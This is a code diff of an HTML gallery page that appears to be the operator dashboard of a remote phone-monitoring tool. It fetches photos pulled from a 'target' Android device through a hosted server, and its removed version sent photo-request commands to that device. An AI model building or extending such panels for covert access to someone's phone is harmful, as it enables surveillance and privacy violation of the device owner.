@@ -12,8 +12,8 @@
             --glass-border: rgba(255, 255, 255, 0.2);
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
-            --accent: #4caf50;
             --cyan: #00f3ff;
+            --accent: #4caf50;
         }
         body {
             background-color: var(--bg-color);
@@ -31,28 +31,9 @@
             min-height: 80vh;
             display: flex; flex-direction: column;
         }
-        
-        /* HEADER */
         .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid var(--glass-border); padding-bottom: 15px; }
-        .title-area { display: flex; align-items: center; gap: 10px; }
-        .back-btn { color: var(--text-main); font-size: 1.2rem; cursor: pointer; transition: 0.3s; text-decoration: none; }
-        .back-btn:hover { color: var(--cyan); transform: translateX(-3px); }
-        .page-title { font-size: 1.1rem; font-weight: bold; text-transform: uppercase; color: var(--cyan); }
+        .back-btn { color: var(--text-main); font-size: 1.2rem; cursor: pointer; text-decoration: none; }
         
-        /* CONTROLS (Load More Buttons) */
-        .controls-row {
-            display: flex; gap: 10px; margin-bottom: 20px; overflow-x: auto; padding-bottom: 5px;
-        }
-        .action-btn {
-            background: var(--glass-bg); border: 1px solid var(--glass-border);
-            color: var(--text-muted); padding: 8px 15px; border-radius: 20px;
-            font-size: 0.75rem; white-space: nowrap; cursor: pointer; transition: 0.3s;
-            display: flex; align-items: center; gap: 5px;
-        }
-        .action-btn:hover { background: rgba(0, 243, 255, 0.15); border-color: var(--cyan); color: white; }
-        .action-btn:active { transform: scale(0.95); }
-
-        /* GALLERY GRID */
         .gallery-grid {
             display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px;
             flex-grow: 1; align-content: start;
@@ -60,192 +41,123 @@
         .img-card {
             aspect-ratio: 1/1; background: var(--glass-bg);
             border-radius: 12px; overflow: hidden; position: relative;
-            border: 1px solid var(--glass-border); cursor: pointer; transition: 0.3s;
+            border: 1px solid var(--glass-border); cursor: pointer;
         }
-        .img-card:hover { transform: scale(1.05); border-color: var(--cyan); z-index: 2; }
         .img-card img { width: 100%; height: 100%; object-fit: cover; }
         
-        .timestamp-badge {
-            position: absolute; bottom: 0; left: 0; width: 100%;
-            background: rgba(0,0,0,0.8); font-size: 0.6rem;
-            color: #ddd; text-align: center; padding: 3px 0;
+        .load-more-container {
+            text-align: center; margin-top: 20px; display: none;
         }
+        .load-more-btn {
+            background: var(--cyan); color: #000; border: none;
+            padding: 10px 25px; border-radius: 20px; font-weight: bold;
+            cursor: pointer; transition: 0.3s;
+        }
+        .load-more-btn:hover { transform: scale(1.05); box-shadow: 0 0 15px var(--cyan); }
 
-        /* LOADING & EMPTY STATE */
-        .status-msg { text-align: center; color: var(--text-muted); margin-top: 50px; font-size: 0.9rem; grid-column: 1 / -1; }
-
-        /* MODAL (Full Screen View) */
+        /* Modal for Zoom */
         .modal {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.95); display: none;
+            background: rgba(0, 0, 0, 0.9); display: none;
             align-items: center; justify-content: center; z-index: 1000;
-            flex-direction: column;
         }
-        .modal img { max-width: 95%; max-height: 80vh; border-radius: 10px; box-shadow: 0 0 20px var(--cyan); }
-        .close-modal {
-            position: absolute; top: 20px; right: 20px;
-            background: rgba(255,255,255,0.1); width: 40px; height: 40px;
-            border-radius: 50%; display: flex; align-items: center; justify-content: center;
-            cursor: pointer; color: white; font-size: 1.2rem;
-        }
+        .modal img { max-width: 90%; max-height: 80vh; border-radius: 10px; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
-            <div class="title-area">
-                <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
-                <span class="page-title">Gallery View</span>
-            </div>
-            <div onclick="loadGallery()" class="action-btn" style="border-radius: 50%; padding: 10px;">
-                <i class="fa-solid fa-rotate-right"></i>
-            </div>
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+            <span style="color: var(--cyan); font-weight: bold;">GALLERY</span>
+            <div onclick="refreshData()" style="cursor: pointer;"><i class="fa-solid fa-rotate"></i></div>
         </div>
 
         <div style="font-size: 0.7rem; color: var(--text-muted); margin-bottom: 15px; text-align: center;">
-            TARGET: <span id="targetID" style="color: var(--cyan); font-weight: bold;">--</span>
-        </div>
-
-        <div class="controls-row">
-            <button class="action-btn" onclick="sendCommand('GALLERY:0')">
-                <i class="fa-solid fa-download"></i> Latest 5
-            </button>
-            <button class="action-btn" onclick="sendCommand('GALLERY:5')">
-                <i class="fa-solid fa-forward"></i> Next 5
-            </button>
-            <button class="action-btn" onclick="sendCommand('GALLERY:10')">
-                <i class="fa-solid fa-forward-fast"></i> Next 10
-            </button>
+            DEVICE: <span id="targetID" style="color: var(--cyan);">--</span>
         </div>
 
         <div class="gallery-grid" id="galleryContainer">
-            <div class="status-msg">
-                <i class="fa-solid fa-spinner fa-spin fa-2x"></i><br><br>
-                Waiting for connection...
             </div>
+
+        <div class="load-more-container" id="loadMoreDiv">
+            <button class="load-more-btn" onclick="showNextFive()">Load More</button>
         </div>
     </div>
 
-    <div class="modal" id="pvModal">
-        <div class="close-modal" onclick="closePreview()"><i class="fa-solid fa-xmark"></i></div>
+    <div class="modal" id="pvModal" onclick="this.style.display='none'">
         <img id="pvImg" src="">
-        <div id="pvDate" style="margin-top: 15px; color: var(--cyan);"></div>
     </div>
 
     <script>
-        // ✅ SERVER URL (Isse change mat karna agar Render par hai)
         const API_BASE = 'https://child-v9no.onrender.com';
-        
-        // 1. URL se ID nikalo
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
+        
+        let allPhotos = []; // Sara data yahan store hoga
+        let displayedCount = 0; // Abhi tak kitni dikhayi
 
-        document.getElementById('targetID').innerText = DEVICE_ID || "No ID Selected";
+        document.getElementById('targetID').innerText = DEVICE_ID || "ERROR";
 
-        // Start
-        window.onload = () => {
-            if(!DEVICE_ID) {
-                document.getElementById('galleryContainer').innerHTML = "<div class='status-msg'>Error: No Device ID Provided.<br><a href='index.html' style='color:var(--cyan)'>Go Back</a></div>";
-                return;
-            }
-            loadGallery();
-        };
-
-        // 2. Load Gallery Function (UPDATED)
-        async function loadGallery() {
+        async function loadGalleryData() {
+            if(!DEVICE_ID) return;
             const container = document.getElementById("galleryContainer");
-            container.innerHTML = "<div class='status-msg'><i class='fa-solid fa-spinner fa-spin'></i> Loading Photos...</div>";
+            container.innerHTML = "<div style='grid-column:1/-1; text-align:center;'>Loading...</div>";
 
             try {
-                // Server se data maango
                 const response = await fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/gallery?t=${Date.now()}`);
-                
-                if (!response.ok) {
-                    throw new Error("Server Response Error");
-                }
-
                 const data = await response.json();
-                container.innerHTML = ""; 
-
-                // Agar data empty hai
-                if (!data || data.length === 0) {
-                    container.innerHTML = `
-                        <div class='status-msg'>
-                            <i class='fa-regular fa-image fa-3x' style='opacity:0.5'></i><br><br>
-                            No photos found yet.<br>
-                            <span style='font-size:0.7rem; color:#666'>Click 'Latest 5' to request photos from phone.</span>
-                        </div>`;
-                    return;
+                
+                if (Array.isArray(data)) {
+                    allPhotos = data;
+                    displayedCount = 0;
+                    container.innerHTML = "";
+                    showNextFive(); // Pehle 5 dikhao
+                } else {
+                    container.innerHTML = "<div style='grid-column:1/-1; text-align:center;'>No photos found.</div>";
                 }
-
-                // Loop through photos
-                data.forEach(item => {
-                    const card = document.createElement("div");
-                    card.className = "img-card";
-                    
-                    // Date formatting
-                    let dateStr = "Unknown Date";
-                    if (item.time) {
-                        dateStr = new Date(parseInt(item.time)).toLocaleString([], { hour12: true, month: 'short', day: 'numeric', hour: '2-digit', minute:'2-digit' });
-                    }
-
-                    // 🔥 BASE64 FIX: Check karo header hai ya nahi
-                    let imgSrc = item.image;
-                    if (!imgSrc.startsWith("data:image")) {
-                        // Agar plain base64 string hai, to header jodo
-                        imgSrc = "data:image/jpeg;base64," + item.image;
-                    }
-
-                    card.innerHTML = `
-                        <img src="${imgSrc}" loading="lazy" alt="Gallery Image">
-                        <div class="timestamp-badge">${dateStr}</div>
-                    `;
-                    
-                    card.onclick = () => openPreview(imgSrc, dateStr);
-                    container.appendChild(card);
-                });
-
             } catch (err) {
-                console.error("Gallery Load Error:", err);
-                container.innerHTML = "<div class='status-msg' style='color:#ff4444'>Failed to load photos.<br>Server might be restarting.</div>";
+                container.innerHTML = "Error loading data.";
             }
         }
 
-        // 3. Send Command (Request Photos from Android)
-        function sendCommand(cmd) {
-            if(!DEVICE_ID) return alert("Error: ID missing");
+        function showNextFive() {
+            const container = document.getElementById("galleryContainer");
+            const loadMoreDiv = document.getElementById("loadMoreDiv");
             
-            // UI Feedback
-            const btn = event.target.closest('.action-btn');
-            const originalText = btn.innerHTML;
-            btn.innerHTML = `<i class="fa-solid fa-check"></i> Sent`;
-            btn.style.color = "var(--accent)";
+            // Agli 5 photos uthao
+            const nextBatch = allPhotos.slice(displayedCount, displayedCount + 5);
             
-            fetch(`${API_BASE}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: cmd })
-            })
-            .then(() => console.log("Cmd Sent: " + cmd))
-            .catch(() => alert("Failed to send command"));
+            nextBatch.forEach(item => {
+                const card = document.createElement("div");
+                card.className = "img-card";
+                
+                let imgSrc = item.image;
+                if (!imgSrc.startsWith("data:image")) imgSrc = "data:image/jpeg;base64," + imgSrc;
 
-            setTimeout(() => { 
-                btn.innerHTML = originalText; 
-                btn.style.color = "var(--text-muted)";
-            }, 2000);
+                card.innerHTML = `<img src="${imgSrc}" loading="lazy">`;
+                card.onclick = () => {
+                    document.getElementById('pvImg').src = imgSrc;
+                    document.getElementById('pvModal').style.display = 'flex';
+                };
+                container.appendChild(card);
+            });
+
+            displayedCount += nextBatch.length;
+
+            // Agar aur photos bachi hain toh button dikhao
+            if (displayedCount < allPhotos.length) {
+                loadMoreDiv.style.display = "block";
+            } else {
+                loadMoreDiv.style.display = "none";
+            }
         }
 
-        // 4. Modal Functions (Zoom View)
-        function openPreview(src, date) {
-            document.getElementById('pvImg').src = src;
-            document.getElementById('pvDate').innerText = date;
-            document.getElementById('pvModal').style.display = 'flex';
+        function refreshData() {
+            loadGalleryData();
         }
 
-        function closePreview() {
-            document.getElementById('pvModal').style.display = 'none';
-        }
+        window.onload = loadGalleryData;
     </script>
 </body>
 </html>
